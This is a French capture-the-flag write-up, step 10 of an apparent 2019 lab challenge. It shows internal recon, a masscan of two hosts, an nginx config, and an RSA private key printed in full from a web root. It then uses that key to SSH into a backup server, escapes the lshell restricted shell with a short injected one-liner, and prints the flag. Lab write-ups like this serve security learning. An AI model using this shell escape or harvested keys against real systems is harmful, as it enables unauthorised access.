# Step 10

## recon

en se basant sur le schéma de je sais plus quelle étape, il y a une autre machine dans ce réseau. Go lancr LinENum:

```bash
./LinEnum.sh -s -r report -e /dev/shm -t
```

dans le arp cache on voit :

```bash
[-] ARP history:
172.16.69.254 dev ens18 lladdr 3e:20:13:a5:09:49 REACHABLE
172.16.69.65 dev ens18 lladdr 96:2e:20:a6:a0:f3 STALE
```

## port scan

* srv02 ?

```bash
➜  www sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 700 172.16.69.65           
Discovered open port 22/tcp on 172.16.69.65                                                                     
```

* veruca machine

```bash
➜  www sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 700 172.16.69.78            
Discovered open port 80/tcp on 172.16.69.78                                    
Discovered open port 22/tcp on 172.16.69.78                                    
```

## configuration web server veruca's machine

deux serveurs web :

* apache
* nginx

rien de psécial dans la conf d'apahce, des trucs rigolos dans la conf de nginx:

```
veruca@SRV01-WEB-WW3:/etc/nginx/sites-available$ ls
default  dev3.challenge.akerva.com
```

Donc dans `/etc/nginx/sites-available/dev3.challenge.akerva.com` on retrouve la config nginx du site du début:

```
server {
	server_name dev3.challenge.akerva.com;
	listen 80;
	listen [::]:80;
	root /usr/share/nginx/dev3.challenge.akerva.com;
	index index.html index.php;
	autoindex off;
	
	add_header X-Frame-Options SAMEORIGIN;
	add_header X-Content-Type-Options nosniff;
	add_header X-XSS-Protection "1; mode=block";

	location / {
		if (-f /usr/share/nginx/dev3.challenge.akerva.com/error/index.html){
		return 503;
		}
	}
	
	location  ~ /\.{
		deny all;
		access_log off;
		log_not_found off;
	}
	
	#Error pages
	error_page 503 /index.html;
	location = /index.html {
		root /usr/share/nginx/dev3.challenge.akerva.com/error/;
		internal;
	}
	
	location ~ ^/.*\.php {
            try_files $uri =503;
            include fastcgi_params;
            fastcgi_pass unix:/run/php/php7.3-fpm.sock;
            fastcgi_split_path_info ^/(.+\.php)(/.*)$;
            fastcgi_index index.php;
            fastcgi_param HTTPS on;
            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
            fastcgi_param PATH_INFO $fastcgi_path_info;
            fastcgi_intercept_errors on;
        }

}
```

le chemin de la racine du site on a:

> /usr/share/nginx/dev3.challenge.akerva.com

## clé privée

```bash
veruca@SRV01-WEB-WW3:/etc/nginx/sites-available$ ls /usr/share/nginx/dev3.challenge.akerva.com
error  golden_tickets  keys  scripts
```

dans le dossiers keys on a une clé privée:

```bash
veruca@SRV01-WEB-WW3:/etc/nginx/sites-available$ cat /usr/share/nginx/dev3.challenge.akerva.com/keys/id_rsa

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA5dnZ83IwhPlKzVY1ZErDhifzoX0IMYyot/yv1zXN6yCNlh8F
JcK1OJVkJbYo1Agrr6rXDC64I72gpddF43GmDZsFQKuLott/5FccEJP3Fiv2E36j
70dKUg5CQmQVIDzxFKCpgKNeg0+dLtjQjCV+dYMKbPhwm6PZgwaoylTwSzylkQuz
g0KyXJUsRaf4WHf2PU5TphM/H7E+RR8LqyfMNjXbWsS4s1hFTrbCKGYoVDnrhJsm
nx7b6zZCt8Ee+uW1R0wd2/dIs8KOycWa5uWQ+L9XKNpb3uwaaOajA/pMamFGkcIU
biFYodY1ycsP8MU5dI7/roAbDV7XkDbp+IPQGwIDAQABAoIBAQDey2TU8fmP2yij
ko2cUk/l6THhdZWMmeAsvzUesRuRbvNu8VCHAo2wdDYny8MVi3n1A+8A8wQwOK3Q
MrOevFmN1Jap0d4/FO6JwdoFQ7d8eU5EJTv4Qq0KjqGxQturbQbtzLGgbDq/o1sj
vqufPPSwKT3g1IwqgQ7kT38q6FwnP6KJs+V3yrqVyJyDUvQ14+WUj846X1T1Uq7W
vc4XWZR44817rBe+aQQ6nhsDta0Wu6kMt190LQ7oDciObliUf7nF58S1MdNcFH9y
aBJrqNjmo/xf7g0UN/ZsLEeEkwjnGrAMNxK4tKSGK7JxFAFEb3rY8Rw1ytLCq95+
vxABMl1hAoGBAPfqz3/rVfboErZJ1xfrwLh1cPv57Vqlrh85DZgbUTSVRwLtS5I1
GibVtdA/0zMhIIj83s9umPc9rVEoejTeNUIhRg5wa2iP1ZTnb9Sc6NoFQcES3dI3
lZVrxMTCtiv3UB3/0klleJnLuao5CeQWhAb6QhsETUPOiE65V5gESbwxAoGBAO1Y
QTGj5IzNhX6D5moUNeIkjAUN98CySYwdbCITk8sRjDY99Epm0VhdIalHNrS4KvO/
GdZ77sJd5KEvsSWbMu/qf+4nQeZ5yZp9DaPPaIhZ8HujT0WPJ4EEz3tht30ygWgu
vW+D9flFU/tvx7G/oU0jTo+dLo4GJ6G6yBjFx9oLAoGBAI/14hg95+VATd1cc3KI
i5iRWdJ4BsQkgT/QOXyiID2QkXO5p7B29YCniLQs289M5T+m1xtM9bZcMlB2WMBq
aDLGb4/i5/wHydZ1rhKgKvavJsee1QBFFq91rQU0q+RL8FH7Q3krWySzkFSwWnYA
PRpwKALYNKWzQKO2LI8xrj+BAoGAEMoZcoWBeWRgeR6jggWD+kdTkFf4mq0B/uNl
7tMrtUW8gWnIiirTzEhqRStAd3A/uZZfIYkKzr0Nm0lgYqSj6czQ1+v3AXLEDCWk
fV4CqwKRvG1FAkqqJLpOYw/6huS3usLzq5vOHqAE3Nh/a9d+dZJ10DryPCG7U/l+
hiIXjRkCgYEAiFMdyRToIATTyA9qmexLmoeZSz8em+7wWfXq8YI/4YwDHANrOyhG
iAHs56wI6Bg32R11Liez8KXAhAuzLMHkJs1vjB+q6vhZ/2yC1ZhK76fAyZ56/A2S
rvhmN515tX++j1BW7lK8I8ANU4XtUhPGeXoRV+d87RnKnDfXrkfvLMI=
-----END RSA PRIVATE KEY-----
```

## connection to the other server

au début j'ai essayé de m'y connecter et à cause de zsh j'ai eu une belle stacktrace:

```bash
➜  step10 git:(master) ✗ ssh violet@172.16.69.65 -i /home/maki/Documents/wonkachall2019/step10/id_rsa
Linux SRV02-BACKUP 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Fri Jul 19 11:36:53 2019 from 10.8.0.14
Traceback (most recent call last):
  File "/usr/bin/lshell", line 52, in <module>
    main()
  File "/usr/bin/lshell", line 38, in main
    userconf = CheckConfig(args).returnconf()
  File "/usr/local/lib/python2.7/dist-packages/lshell/checkconfig.py", line 69, in __init__
    self.get_global()
  File "/usr/local/lib/python2.7/dist-packages/lshell/checkconfig.py", line 145, in get_global
    self.config.read(self.conf['configfile'])
  File "/usr/local/lib/python2.7/dist-packages/backports/configparser/__init__.py", line 697, in read
    self._read(fp, filename)
  File "/usr/local/lib/python2.7/dist-packages/backports/configparser/__init__.py", line 1027, in _read
    for lineno, line in enumerate(fp, start=1):
  File "/usr/lib/python2.7/encodings/ascii.py", line 26, in decode
    return codecs.ascii_decode(input, self.errors)[0]
UnicodeDecodeError: 'ascii' codec can't decode byte 0xc2 in position 2854: ordinal not in range(128)
Connection to 172.16.69.65 closed.
```

grâce à cette erreur on sait que le shell restreint c'est `lshell`: https://github.com/ghantoos/lshell/

après avoir discuté avec les orgas, j'ai du changer mon shell par défaut par `bash` et ça fonctionne très bien, j'arrive bien dans le lshell en tant que violet (merci le hint) :

```bash
maki@Laptop-OPMD-SecOPS:~/Documents/wonkachall2019$ ssh -i /home/maki/Documents/wonkachall2019/step10/id_rsa violet@172.16.69.65 
Linux SRV02-BACKUP 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Fri Jul 19 14:05:48 2019 from 10.8.0.26
You are in a limited shell.
Type '?' or 'help' to get the list of allowed commands
violet:~$
```

## escape

j'ai été sur le github de `lshell` dans la section "issue", avec un petit filtre sur "security" je tombe sur ce lien : https://github.com/ghantoos/lshell/labels/security

Et cette réponse nous donne quoi faire pour escape : https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754

```bash
violet:~$ echo bite && cd () bash && cd
bite
violet@SRV02-BACKUP:/usr/local/share/golden_tickets$ id
uid=1000(violet) gid=1000(violet) groupes=1000(violet),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1002(lshell)
```

## flag

```bash
violet@SRV02-BACKUP:~$ cat flag-10.txt 
d9c47d61bc453be0f870e0a840041ba054c6b7f725812ca017d7e1abd36b9865
```